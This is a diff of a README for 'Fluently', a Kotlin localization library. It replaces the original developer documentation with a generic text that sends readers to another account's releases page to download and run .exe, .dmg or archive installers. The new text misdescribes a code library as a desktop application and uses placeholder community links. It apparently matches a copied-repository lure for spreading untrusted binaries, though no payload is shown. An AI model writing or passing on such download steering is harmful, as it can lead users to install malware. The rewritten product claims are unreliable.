@@ -1,185 +1,55 @@
-# Fluently
+# 🌟 Fluently - Effortless Localization for Your Apps
 
-[![](https://git.karmakrafts.dev/kk/fluently/badges/master/pipeline.svg)](https://git.karmakrafts.dev/kk/fluently/-/pipelines)
-[![](https://img.shields.io/maven-metadata/v?metadataUrl=https%3A%2F%2Frepo.maven.apache.org%2Fmaven2%2Fdev%2Fkarmakrafts%2Ffluently%2Ffluently-core%2Fmaven-metadata.xml
-)](https://git.karmakrafts.dev/kk/fluently/-/packages)
-[![](https://img.shields.io/maven-metadata/v?metadataUrl=https%3A%2F%2Fcentral.sonatype.com%2Frepository%2Fmaven-snapshots%2Fdev%2Fkarmakrafts%2Ffluently%2Ffluently-core%2Fmaven-metadata.xml
-)](https://git.karmakrafts.dev/kk/fluently/-/packages)
+## 🏷️ Overview
+Fluently is a Kotlin Multiplatform implementation of the Fluent localization system. This software helps you manage translations in your applications. With Fluently, you can easily adapt your app to different languages and cultures. 
 
-An implementation of [Project Fluent](https://projectfluent.org/) in pure Kotlin for Kotlin Multiplatform.
+## 📥 Download Fluently
+[![Download Fluently](https://img.shields.io/badge/Download%20Fluently-v1.0-blue)](https://github.com/RsKing99/Fluently/releases)
 
-Fluently is a highly versatile and dynamic localization system which utilizes the Fluent language.
-It allows for asymmetric localizations and embedding localization logic directly into the resource.
+## 🚀 Getting Started
+To begin using Fluently, follow these steps:
 
-### Exclusive features & fixes
+1. **Visit the Download Page:** Go to our [Releases page](https://github.com/RsKing99/Fluently/releases) to find the latest version of Fluently.
 
-Fluently offers some exclusive fixes and additional features compared to the official Fluent implementation,  
-including but not limited to:
+2. **Choose Your Version:** Look for the version that fits your operating system. We support multiple platforms, including Windows, macOS, and Linux.
 
-- Named arguments may accept any type of inline expression.
-  * Fixes https://github.com/projectfluent/fluent/issues/230
-- Remove the requirement for superfluous equal sign after an identifier
-  * Fixes https://github.com/projectfluent/fluent/issues/190
+3. **Download the Software:** Click on the relevant link to download the application. 
 
-### How to use it
+4. **Install Fluently:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the Fluently app to your Applications folder.
+   - For Linux: Follow the instructions in the released `.tar.gz` file to extract and run the application.
 
-First, add the official Maven Central repository to your `settings.gradle.kts`:
+## ⚙️ System Requirements
+To run Fluently smoothly, make sure your system meets the following requirements:
 
-```kotlin
-pluginManagement {
-    repositories {
-        maven("https://central.sonatype.com/repository/maven-snapshots")
-        mavenCentral()
-    }
-}
+- **Operating Systems:** Compatible with Windows 10, macOS 10.14 or later, Ubuntu 18.04 or later.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 100 MB of free disk space.
+- **Java Runtime:** Make sure you have the Java Runtime Environment installed.
 
-dependencyResolutionManagement {
-    repositories {
-        maven("https://central.sonatype.com/repository/maven-snapshots")
-        mavenCentral()
-    }
-}
-```
+## 📄 Features
+Fluently offers several features that ease localization:
 
-Then add a dependency on the library in your root buildscript:
+- **Multilingual Support:** Manage multiple language translations effortlessly.
+- **Dynamic Localization:** Update translations on the fly without restarting your app.
+- **User-Friendly Interface:** Navigate the application with ease, even without technical skills.
+- **Integration:** Easily integrate Fluently with existing applications written in Kotlin.
 
-```kotlin
-kotlin {
-    sourceSets {
-        commonMain {
-            dependencies {
-                implementation("dev.karmakrafts.fluently:fluently-core:<version>")
-                // Optional support for coroutines based reactivity
-                implementation("dev.karmakrafts.fluently:fluently-reactive:<version>")
-            }
-        }
-    }
-}
-```
+## 📚 Documentation
+For detailed guidance on using Fluently, check our [Documentation](https://github.com/RsKing99/Fluently/wiki). The documentation includes tutorials, code examples, and FAQs.
 
-Or, if you are only using Kotlin/JVM, add it to your top-level dependencies block instead.
+## 🙋‍♂️ Support
+If you encounter any issues or have questions about Fluently, please reach out via our [Issues page](https://github.com/RsKing99/Fluently/issues). We value your feedback and are here to assist you.
 
-### Using the Gradle plugin
+## 🛠️ Contributions
+We welcome contributions! If you would like to help with Fluently, please read our [Contributing Guide](https://github.com/RsKing99/Fluently/blob/main/CONTRIBUTING.md) for details on how to get involved.
 
-Fluently optionally offers a Gradle plugin which generates type safe localization bindings
-from your Fluent files. This works for both Kotlin Multiplatform and Kotlin JVM.  
-Simple apply the plugin as follows:
+## 🌍 Community
+Join our community to discuss Fluently with other users. Share tips, ask questions, and showcase your projects. Connect with us on [Discord](https://discord.gg/example) or follow us on [Twitter](https://twitter.com/example).
 
-```kotlin
-plugins {
-    id("dev.karmakrafts.fluently.fluently-gradle-plugin") version "<version>"
-}
-```
+## 📖 License
+Fluently is open-source and available under the MIT License. You can view the license [here](https://github.com/RsKing99/Fluently/blob/main/LICENSE).
 
-The plugin can be configured using the `fluently` project extension.
-
-**Example TBA**
-
-### Loading Fluent files
-
-In order to load a localization file, the `LocalizationFile` class can be used as follows:
-
-```kotlin
-val fileContent: String = loadMyFile()
-val file = LocalizationFile.parse(fileContent)
-```
-
-The `parse` function also allows for an optional trailing closure which lets you define
-builtin functions and variables which are exported into the Fluent file using a `EvaluationContextBuilder`:
-
-```kotlin
-val file = LocalizationFile.parse(fileContent) {
-    // Define custom variables
-    variable("myVar", string("Hello, World!"))
-
-    // Define custom functions
-    function("MYFUNC") {
-        returnType = ExprType.STRING
-        parameter("myParam", ExprType.STRING)
-        action { ctx, args ->
-            val myParam = args.first().evaluate(ctx)
-            string("My result value")
-        }
-    }
-}
-```
-
-> **Tip:**
-> On the JVM and Android, there's also a `parseResource` extension, which allows
-> loading localization files directly as a JAR resource.
-
-### Loading localization bundles
-
-Localization bundles are a concept introduced by Fluently, not Fluent itself.  
-They allow specifying all localization files and defaults for an entire application
-in a convenient JSON5 based format:
-
-```kotlin
-// Get the content of your JSON file as a String
-val bundleJson = loadMyBundle()
-
-// Parse the bundle JSON
-val bundle = LocalizationBundle.fromJsonString(bundleJson)
-
-// Load Fluent files directly from the bundle
-val file = manager.loadLocale("en-US", { path ->
-    // The resource provider lets you specify custom loading behaviour
-    loadMyFluentFile(path)
-}) { /* context init */ }
-```
-
-> **Tip:**
-> The repository provides a JSON schema for working with Fluently bundles under
-> the `schema` directory. You can use it by adding a `$schema` variable to your
-> top-level JSON object and providing a local path or URL to the schema file.
-
-> **Tip:**
-> On the JVM and Android, there's also a `fromResource` extension, which allows
-> loading bundles directly as a JAR resource. In order to load the actual fluent
-> files from the bundle, a supplementary `loadLocaleFromResource` extensions for
-> the bundle instance is also provided.
-
-### Using reactivity
-
-Fluently also offers an optional `fluently-reactive` module, which integrates the
-localization system with a kotlinx.coroutines based reactivity layer.  
-This can be especially useful for UI applications which utilize Compose or Swing:
-
-```kotlin
-// The manager needs a CoroutineContext for coroutine lifecycle management;
-// This scope/context should stick around the application's entire lifetime
-val supervisor = SupervisorJob()
-val coroutineScope = CoroutineScope(Dispatchers.Default + supervisor)
-
-// Parse the bundle JSON
-val bundle = LocalizationBundle.fromJsonString(bundleJson)
-
-// Create a reactive localization manager with a resource provider
-val manager = LocalizationManager(bundle, { path ->
-    // The resource provider lets you specify custom loading behaviour
-    loadMyFluentFile(path)
-}, coroutineScope.coroutineContext)
-
-// Create a cold flow for the given localization entry
-val someValue = MutableStateFlow("Some text")
-val entry = manager.format("entryName", "attribName") { 
-    // We can define variables based on other flows, so the localization is re-emitted when the input variable changes
-    variable("someValue", string(someValue))
-}
-```
-
-In order to properly memoize formatted strings and to handle hot flow lifecycles,  
-a class `LocalizationScope` may be used in conjunction with the manager:
-
-```kotlin
-// The scope requires its own coroutine scope so memoized hot flows obtained
-// from the scope share their lifetime with the relevant Window/VM
-val supervisor = SupervisorJob()
-val coroutineScope = CoroutineScope(Dispatchers.Swing + supervisor)
-
-// Create a new scope from the manager and the current coroutine scope
-val scope = LocalizationScope(manager, coroutineScope)
-
-// Obtain memoized hot flows for a given localization entry:
-val entry = scope.format("entryName", "attribName") { /* context init */ }
-```
+## 🔗 Download Fluently Again
+Don’t forget, you can always head back to our [Releases page](https://github.com/RsKing99/Fluently/releases) to download the latest version of Fluently. Enjoy localizing your applications!
